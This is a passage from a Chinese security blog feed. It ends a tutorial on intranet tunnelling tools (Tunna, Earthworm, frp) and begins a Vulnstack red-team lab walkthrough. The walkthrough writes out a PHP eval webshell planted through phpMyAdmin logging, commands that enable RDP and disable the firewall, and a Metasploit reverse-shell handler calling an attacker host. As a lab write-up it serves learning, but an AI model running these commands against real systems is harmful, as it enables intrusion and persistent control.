language-none"><code class="language-none">socks5 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323163201935.png"></p><h3 id="1-3-测试-1"><a href="#1-3-测试-1" class="headerlink" title="1.3 测试"></a>1.3 测试</h3><p>命令前面加上proxychains 运行命令，（跳板机php环境已启动，存在主页index.php）</p><pre class="line-numbers language-none"><code class="language-none">proxychains curl http:&#x2F;&#x2F;192.168.52.143<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323170043720.png"></p><h2 id="0x03-Tunna"><a href="#0x03-Tunna" class="headerlink" title="0x03 Tunna"></a>0x03 Tunna</h2><p>Tunna:可以通过HTTP封装隧道通信任何TCP，以及用于绕过防火墙环境中的网络限制</p><pre class="line-numbers language-none"><code class="language-none">常用参数：-u 远程代理脚本地址-l 表示本地监听的端口-r 远程映射端口-v 输出详细数据-a 代理远程连接的主机地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传conn.php到已控制的跳板主机上</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323170933348.png"></p><p>在攻击机上访问<a href="http://192.168.1.9/conn.php">http://192.168.1.9/conn.php</a></p><p>在攻击主机上执行命令，将内网服务器（192.168.52.138）的80端口映射到本地5555端口</p><pre class="line-numbers language-none"><code class="language-none">python proxy.py -u http:&#x2F;&#x2F;192.168.1.9&#x2F;conn.php -l 5555 -a 192.168.52.138 -r 80 –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323174156617.png"></p><p>在攻击机上即可访问内网服务器的80端口</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323174249007.png"></p><h2 id="0x04-Earthworm-Socks5代理"><a href="#0x04-Earthworm-Socks5代理" class="headerlink" title="0x04 Earthworm Socks5代理"></a>0x04 Earthworm Socks5代理</h2><p>EW 是一套便携式全平台的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透</p><p>Github第三方下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/0b2f286b2f629240f2e29556af172099.png" alt="image-20211220130325406" style="zoom: 80%;"><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处</p><h3 id="1-1-正向代理"><a href="#1-1-正向代理" class="headerlink" title="1.1 正向代理"></a>1.1 正向代理</h3><p>将 ew win 版放到跳板机上，使用以下命令启动代理</p><pre class="line-numbers language-none"><code class="language-none">ew_for_Win.exe -s ssocksd -l 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201205508.png"></p><p>设置<code>/etc/proxychains.conf</code>文件</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.9 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置后使用代理访问即可</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201242826.png"></p><h3 id="1-2-反向代理"><a href="#1-2-反向代理" class="headerlink" title="1.2 反向代理"></a>1.2 反向代理</h3><p>如果内网存在防火墙，正向连接很可能会被拦截，这是可以使用反向代理来突破防火墙限制，从内部连接外部</p><ol><li><p>在跳板机上执行命令，开启端口转发</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe -s rcsocks -l <span class="token number">7777</span> -e <span class="token number">1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323201557951.png"></p></li><li><p>在内网目标机win2008上执行命令，开启代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ew_for_Win.exe -s rssocks -d <span class="token number">192.168</span>.52.143 -e <span class="token number">1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323212844176.png"></p></li><li><p>攻击者修改配置文件在<code>/etc/proxychins.conf</code>增加<code>socks5 192.1.9 7777</code></p><p>设置完毕后攻击者即可使用代理访问内网目标机win2008，但是整个过程需要三方都参与，而且需要内网主机上传 EW 和启动，无疑是复杂度提升，适用于已经拿到内网主机权限的情况</p></li></ol><h2 id="0x05-Frp-穿透"><a href="#0x05-Frp-穿透" class="headerlink" title="0x05 Frp 穿透"></a>0x05 Frp 穿透</h2><p>项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>frp 是一个可用于内网穿透的高性能的全平台反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网Frp 分为服务端和客户端</p><p>服务端只能为 Linux 负责处理请求，转发流量<br>客户端 linux 和 windows 都支持 负责把本地的流量连到服务器，让服务器读取&amp;写入</p><p>在kali攻击机设置frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323204509073.png"></p><p>在跳板机上设置frpc.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; 192.168.1.5server_port &#x3D; 6666[http_proxy]type&#x3D;tcpremote_port&#x3D;7777plugin&#x3D;socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323204838866.png"></p><p>再在攻击机上面配置proxychains代理，即可访问到内网目标机</p><pre class="line-numbers language-none"><code class="language-none">socks 192.168.1.5 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样使用nmap扫描内网目标机win2008</p><p><img src="/2021/10/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20220323205355590.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;构建内网隐蔽通道，从而突破各种安全策略限制，实现对目标服务器的完美控制。&lt;br&gt;当我们从外网成功获得</summary>
      
    
    
    
    
    <category term="端口转发" scheme="https://hdys0vn.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列一</title>
    <link href="https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/"/>
    <id>https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/</id>
    <published>2021-10-16T00:14:03.000Z</published>
    <updated>2022-03-26T08:57:06.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）"><a href="#ATT-amp-CK红队评估实战靶场（一）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一）"></a>ATT&amp;CK红队评估实战靶场（一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>一直想要学习内网知识，看了很多文章，感觉还是眼高手低，整个靶场打下来还是不太顺利，自己很多知识点也是有点模糊，不说了菜鸡是好菜啊！！！</p><p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316081903337.png"></p><h2 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083407043.png"></p><h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>​    发现IP192.168.1.102，使用nmap探测其端口开放情况</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083633458.png"></p><p>​    发现80端口开启，访问页面<code>http://192.168.1.103/</code>发现页面如下，存在大量信息泄露，收集有效信息</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083750415.png"></p><h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>​    使用使用御剑目录扫描专业版进行目录扫描(网站目录扫描的全面及准确性与字典有关，良好的字典能够发现别人发现不了的目录)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316085429546.png"></p><p>​    发现网站备份文件和phpadmin后台管理界面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090035081.png"></p><p>​    打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.3/yxcms</code>进入网站首页</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090223570.png"></p><h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>​    网站泄露后台地址和用户密码，且用户密码为弱口令</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090332375.png"></p><p>​    成功登陆网站后台</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090504559.png"></p><h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2 漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2 漏洞二：PhpMyAdmin弱口令</h5><p>​    发现使用默认用户名&#x2F;口令（root&#x2F;root）成功登录PhpMyAdmin管理页面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090650585.png"></p><h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞</h5><p>​    前台提交带有XSS代码的留言</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091444360.png"></p><p>​    后台审核时成功弹出xss窗口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091557461.png"></p><p>​    审核通过后在网站留言板部分也会弹出xss弹窗</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091847996.png"></p><p>​    可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p><h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞</h5><p>​    在后台创建新模板模块创建内容为一句话的新模板</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316111906759.png"></p><p>通过前面的备份文件可知文件保存的目录</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.3&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100450964-1245106639.png"></p><p>​    使用蚁剑成功连接shell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112139929.png"></p><h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5 漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5 漏洞五：yxcms后台SQL注入漏洞</h5><p>​    在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p><h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>​    前面我们已经登陆到phpmyadmin，那么我们首先可以测试一下是否可以使用select into outfile直接写入</p><pre class="line-numbers language-none"><code class="language-none">Select &#39;&lt;?php eval($_POST[hack]);?&gt; &#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112634592.png"></p><p>写入失败， </p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%secure%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看变量secure-file-priv 值为NULL，且为只读无法修改。</p><p>尝试使用全局日志写入shell，查看全局变量general_log：</p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%general_%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113228177.png"></p><p>开启全局日志并修改日志保存位置为C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php</p><pre class="line-numbers language-none"><code class="language-none">set global general_log&#x3D;on;set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113435571.png"></p><p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113553829.png"></p><p>使用蚁剑连接一句话木马<code>http://192.168.1.3/hack.php</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p><h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.5主机上，创建监听并生成powershell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316115646878.png"></p><p>提权成功</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120020075.png"></p><h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p><pre class="line-numbers language-none"><code class="language-none">shell ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316125752478.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120358179.png"></p><p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>net group “domain computers” /domain <span class="token comment">#查看域成员计算机列表</span>net group “domain admins” /domain <span class="token comment">#查看域管理员用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100603667-966546984.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100608263-1817479356.png"></p><p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p><h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121241458.png"></p><h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注册表开启3389端口REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f关闭防火墙netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment">#winsows server 2003 之前</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off <span class="token comment">#winsows server 2003 之后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p><p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p><h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.1.5set lport 8888exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318163608922.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318170258970.png"></p><h3 id="4-2-内网–继续信息收集"><a href="#4-2-内网–继续信息收集" class="headerlink" title="4.2 内网–继续信息收集"></a>4.2 内网–继续信息收集</h3><h4 id="4-2-1-补丁信息"><a href="#4-2-1-补丁信息" class="headerlink" title="4.2.1 补丁信息"></a>4.2.1 补丁信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173346684.png"></p><h4 id="4-2-2-软件安装信息"><a href="#4-2-2-软件安装信息" class="headerlink" title="4.2.2 软件安装信息"></a>4.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173500987.png"></p><h4 id="4-2-3-路由信息并添加路由"><a href="#4-2-3-路由信息并添加路由" class="headerlink" title="4.2.3 路由信息并添加路由"></a>4.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p><pre class="line-numbers language-none"><code class="language-none">#查看路由信息run 